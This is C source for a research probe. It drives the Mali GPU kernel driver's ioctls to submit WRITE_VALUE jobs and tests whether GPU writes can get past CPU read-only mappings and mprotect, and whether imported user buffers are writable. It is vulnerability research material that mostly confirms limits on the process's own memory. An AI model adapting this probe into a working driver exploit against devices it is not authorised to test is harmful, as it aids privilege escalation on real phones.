/*
 * GPU WRITE_VALUE mprotect Bypass + USER_BUFFER Import Probe
 *
 * Tests:
 *   T1: Baseline — WRITE_VALUE to own SAME_VA alloc (sanity)
 *   T2: USER_BUFFER import → WRITE_VALUE (expected fail)
 *   T3: SAME_VA with CPU_RD-only mmap → GPU write (mprotect bypass)
 *   T4: SAME_VA full perms → mprotect(PROT_READ) → GPU write
 *
 * Build: make -f ../../common/Makefile.ndk
 * Run:   ./probe_mprotect_bypass
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <poll.h>

#include "mali.h"

#define PAGE_SZ 0x1000

#define MALI_JOB_TYPE_WRITE_VALUE 2
#define MALI_WR_IMMEDIATE_64  7

static int mali_open_ctx(void)
{
    int fd = open("/dev/mali0", O_RDWR);
    if (fd < 0) return -1;
    struct kbase_ioctl_version_check ver = {0, 0};
    if (ioctl(fd, KBASE_IOCTL_VERSION_CHECK, &ver)) { close(fd); return -1; }
    struct kbase_ioctl_set_flags sf = {0};
    if (ioctl(fd, KBASE_IOCTL_SET_FLAGS, &sf)) { close(fd); return -1; }
    mmap(NULL, PAGE_SZ, PROT_NONE, MAP_SHARED, fd, BASE_MEM_MAP_TRACKING_HANDLE);
    return fd;
}

static uint64_t mali_alloc_gpu(int fd, uint64_t pages, uint32_t flags,
                               void **cpu_ptr)
{
    union kbase_ioctl_mem_alloc alloc = {};
    alloc.in.va_pages = pages;
    alloc.in.commit_pages = pages;
    alloc.in.flags = flags;

    if (ioctl(fd, KBASE_IOCTL_MEM_ALLOC, &alloc)) return 0;

    uint64_t gpu_va = alloc.out.gpu_va;
    if (cpu_ptr) {
        int prot = PROT_READ;
        if (flags & BASE_MEM_PROT_CPU_WR) prot |= PROT_WRITE;
        *cpu_ptr = mmap(NULL, pages * PAGE_SZ, prot, MAP_SHARED, fd, gpu_va);
        if (*cpu_ptr == MAP_FAILED) *cpu_ptr = NULL;
    }
    return gpu_va;
}

static void build_write_value(void *buf, uint64_t target_addr, uint64_t imm)
{
    uint32_t *cl = (uint32_t *)buf;
    memset(cl, 0, 56);
    cl[4] = (1 << 0) | (MALI_JOB_TYPE_WRITE_VALUE << 1);
    uint32_t *payload = cl + 8;
    payload[0] = (uint32_t)(target_addr);
    payload[1] = (uint32_t)(target_addr >> 32);
    payload[2] = MALI_WR_IMMEDIATE_64;
    payload[4] = (uint32_t)(imm);
    payload[5] = (uint32_t)(imm >> 32);
}

static int submit_and_wait(int fd, uint64_t jc, uint8_t atom_nr)
{
    struct {
        uint64_t jc;
        uint64_t udata[2];
        uint64_t extres_list;
        uint16_t nr_extres;
        uint8_t  jit_id[2];
        uint8_t  pre_dep[4];
        uint8_t  atom_number;
        uint8_t  prio;
        uint8_t  device_nr;
        uint8_t  jobslot;
        uint32_t core_req;
    } __attribute__((packed)) atom;

    memset(&atom, 0, sizeof(atom));
    atom.jc = jc;
    atom.core_req = BASE_JD_REQ_CS;
    atom.atom_number = atom_nr;

    struct kbase_ioctl_job_submit submit = {
        .addr = (uint64_t)&atom, .nr_atoms = 1, .stride = 48,
    };

    if (ioctl(fd, KBASE_IOCTL_JOB_SUBMIT, &submit)) {
        printf("    JOB_SUBMIT: %s\n", strerror(errno));
        return -1;
    }

    struct pollfd pfd = { .fd = fd, .events = POLLIN };
    if (poll(&pfd, 1, 2000) <= 0) { printf("    poll timeout\n"); return -1; }

    struct {
        uint32_t event_code;
        uint8_t  atom_number;
        uint8_t  pad[3];
        uint64_t udata[2];
    } ev;
    memset(&ev, 0, sizeof(ev));
    if (read(fd, &ev, sizeof(ev)) <= 0) return -1;

    printf("    event=0x%x", ev.event_code);
    if (ev.event_code == 1) printf(" (DONE)");
    else if (ev.event_code == 0x48) printf(" (TRANSLATION_FAULT)");
    else if (ev.event_code == 0x4A) printf(" (PERMISSION_FAULT)");
    printf("\n");
    return ev.event_code;
}

static void check_result(volatile uint64_t *ptr, uint64_t magic,
                         const char *label)
{
    uint64_t rb = *ptr;
    printf("    readback=0x%llx", (unsigned long long)rb);
    if (rb == magic)
        printf(" *** %s ***\n", label);
    else if (rb == 0xDEADDEADDEADDEADULL)
        printf(" (unchanged — write did not reach target)\n");
    else
        printf(" (unexpected value)\n");
}

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("=== GPU WRITE_VALUE mprotect Bypass Probe ===\n");
    printf("[*] uid=%d\n\n", getuid());

    uint64_t magic = 0xC4A1A227060BCEDFULL;

    /* T1: Baseline — SAME_VA write */
    printf("[T1] Baseline: WRITE_VALUE to own SAME_VA alloc\n");
    {
        int fd = mali_open_ctx();
        if (fd < 0) { printf("    SKIP\n\n"); goto t2; }

        void *buf = NULL;
        mali_alloc_gpu(fd, 2,
            BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
            BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR, &buf);
        if (!buf) { close(fd); goto t2; }

        volatile uint64_t *tgt = (volatile uint64_t *)((char *)buf + PAGE_SZ);
        *tgt = 0xDEADDEADDEADDEADULL;

        build_write_value(buf, (uint64_t)tgt, magic);
        submit_and_wait(fd, (uint64_t)buf, 1);
        check_result(tgt, magic, "BASELINE OK");
        close(fd);
    }

t2:
    printf("\n[T2] USER_BUFFER import -> WRITE_VALUE (CPU VA target)\n");
    {
        int fd = mali_open_ctx();
        if (fd < 0) { printf("    SKIP\n\n"); goto t3; }

        void *ubuf = mmap(NULL, PAGE_SZ, PROT_READ | PROT_WRITE,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (ubuf == MAP_FAILED) { close(fd); goto t3; }

        *(volatile uint64_t *)ubuf = 0xDEADDEADDEADDEADULL;

        struct base_mem_import_user_buffer ub = {
            .ptr = (uint64_t)ubuf, .length = PAGE_SZ
        };
        union kbase_ioctl_mem_import imp = {};
        imp.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD |
                       BASE_MEM_PROT_GPU_WR;
        imp.in.phandle = (uint64_t)&ub;
        imp.in.type = BASE_MEM_IMPORT_TYPE_USER_BUFFER;

        if (ioctl(fd, KBASE_IOCTL_MEM_IMPORT, &imp)) {
            printf("    import failed: %s\n", strerror(errno));
            munmap(ubuf, PAGE_SZ); close(fd); goto t3;
        }
        printf("    import gpu_va=0x%llx, CPU VA=%p\n",
               (unsigned long long)imp.out.gpu_va, ubuf);

        void *desc = NULL;
        mali_alloc_gpu(fd, 1,
            BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
            BASE_MEM_PROT_GPU_RD, &desc);
        if (!desc) { munmap(ubuf, PAGE_SZ); close(fd); goto t3; }

        build_write_value(desc, (uint64_t)ubuf, magic);
        submit_and_wait(fd, (uint64_t)desc, 1);
        check_result((volatile uint64_t *)ubuf, magic, "IMPORT WRITE OK");

        munmap(ubuf, PAGE_SZ);
        close(fd);
    }

t3:
    printf("\n[T3] SAME_VA alloc (CPU_RD only mmap) -> GPU write\n");
    {
        int fd = mali_open_ctx();
        if (fd < 0) { printf("    SKIP\n\n"); goto t4; }

        void *desc = NULL;
        mali_alloc_gpu(fd, 1,
            BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
            BASE_MEM_PROT_GPU_RD, &desc);
        if (!desc) { close(fd); goto t4; }

        void *ro_buf = NULL;
        mali_alloc_gpu(fd, 1,
            BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD |
            BASE_MEM_PROT_GPU_WR, &ro_buf);
        if (!ro_buf) { close(fd); goto t4; }

        printf("    target at %p (CPU PROT_READ, GPU_WR)\n", ro_buf);
        build_write_value(desc, (uint64_t)ro_buf, magic);
        submit_and_wait(fd, (uint64_t)desc, 1);

        uint64_t rb = *(volatile uint64_t *)ro_buf;
        printf("    readback=0x%llx", (unsigned long long)rb);
        if (rb == magic)
            printf(" *** GPU WROTE THROUGH CPU-RO PAGE ***\n");
        else
            printf(" (write did not land)\n");

        close(fd);
    }

t4:
    printf("\n[T4] SAME_VA full perms -> mprotect(PROT_READ) -> GPU write\n");
    {
        int fd = mali_open_ctx();
        if (fd < 0) { printf("    SKIP\n\n"); goto done; }

        void *buf = NULL;
        mali_alloc_gpu(fd, 2,
            BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR |
            BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR, &buf);
        if (!buf) { close(fd); goto done; }

        volatile uint64_t *tgt = (volatile uint64_t *)((char *)buf + PAGE_SZ);
        *tgt = 0xDEADDEADDEADDEADULL;
        printf("    wrote sentinel via CPU\n");

        if (mprotect((void *)tgt, PAGE_SZ, PROT_READ)) {
            printf("    mprotect failed: %s\n", strerror(errno));
            close(fd); goto done;
        }
        printf("    mprotect -> PROT_READ\n");

        build_write_value(buf, (uint64_t)tgt, magic);
        submit_and_wait(fd, (uint64_t)buf, 1);
        check_result(tgt, magic, "GPU WROTE THROUGH mprotect-RO PAGE");

        close(fd);
    }

done:
    printf("\n=== Summary ===\n");
    printf("T1: SAME_VA write = expected success (baseline)\n");
    printf("T2: USER_BUFFER import = expected TRANSLATION_FAULT\n");
    printf("T3: CPU_RD-only + GPU_WR = mprotect bypass test\n");
    printf("T4: mprotect(PROT_READ) after full alloc = mprotect bypass test\n");
    printf("\nGPU page tables are independent of CPU mprotect.\n");
    printf("But GPU can only reach SAME_VA regions (userspace only).\n");

    return 0;
}
